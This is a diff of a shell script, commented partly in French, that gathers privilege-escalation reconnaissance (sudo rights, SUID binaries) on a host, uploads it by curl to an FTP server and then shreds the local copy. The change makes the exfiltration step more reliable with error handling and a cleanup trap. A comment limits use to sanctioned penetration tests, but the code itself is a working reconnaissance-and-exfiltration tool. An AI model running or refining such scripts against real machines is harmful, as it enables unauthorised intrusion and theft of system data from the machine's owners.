@@ -39,7 +39,8 @@ fi
 # exfiltration mechanism must only be used in authorized contexts such as
 # sanctioned penetration tests. Using it without permission is prohibited.
 
-OUT="/dev/shm/.syslog.tmp"
+OUT="$(mktemp)"
+trap 'rm -f "$OUT"' EXIT
 > "$OUT"
 
 # Collecte minimale
@@ -62,7 +63,15 @@ sudo -l 2>/dev/null | grep -v "may not" >> "$OUT"
 find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null | grep -E 'bash|python|perl|find|nmap' >> "$OUT"
 
 # Exfiltration via FTP (modification demandée)
-curl -s -T "$OUT" "ftp://$FTP_USER:$FTP_PASS@$FTP_HOST/$FTP_PATH" --ftp-create-dirs >/dev/null
+if ! command -v curl >/dev/null 2>&1; then
+    echo "❌ curl n'est pas installé" >&2
+    exit 1
+fi
+
+if ! curl -s -T "$OUT" "ftp://$FTP_USER:$FTP_PASS@$FTP_HOST/$FTP_PATH" --ftp-create-dirs >/dev/null; then
+    echo "❌ Échec de l'exfiltration via curl" >&2
+    exit 1
+fi
 
 # Nettoyage
 shred -u "$OUT"
